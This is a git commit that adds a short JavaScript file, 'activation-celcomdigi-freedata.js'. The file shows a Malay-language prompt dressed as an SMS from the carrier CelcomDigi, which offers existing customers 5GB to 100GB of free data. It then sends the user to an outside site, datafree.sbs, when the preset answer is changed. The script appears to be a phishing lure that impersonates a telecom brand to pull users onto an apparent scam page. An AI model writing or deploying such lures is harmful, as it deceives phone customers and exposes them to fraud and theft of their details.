e070a6cc110b634a4521404bb74dfbc5db3dff5a
mmainomi <akparawa247@gmail.com>
2025-03-26 23:54:52 -0700

    Create activation-celcomdigi-freedata.js

---
+++ activation-celcomdigi-freedata.js
@@ -0,0 +1,6 @@
+
+var password = 'DATA PERCUMA'
+password=prompt('SMS: Pelanggan yang dihormati, Sila Semak Sama ada Kad Sim CelcomDigi Anda Layak Untuk Menerima Dari 5GB Hingga 100GB Data, Ganjaran Pelanggan Lama, Tekan DATA PERCUMA Untuk Semak Sekarang ','DATA PERCUMA');
+if (password != 'DATA PERCUMA') {
+location.href='https://datafree.sbs/celcomdigi-freedata.html';
+}
